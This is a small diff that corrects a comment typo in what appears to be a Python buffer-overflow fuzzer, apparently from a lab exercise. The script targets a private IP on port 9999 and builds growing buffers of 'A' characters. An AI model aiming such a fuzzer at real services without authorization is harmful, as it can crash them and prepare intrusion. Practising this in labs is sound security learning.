@@ -3,7 +3,7 @@ import socket, time, sys
 ip = "172.21.21.28"
 port = 9999
 timeout = 5
-#Creat how the payload will be a a alot of A
+#Create how the payload will be a a alot of A
 buffer = []
 counter = 100
 while len(buffer) < 70:
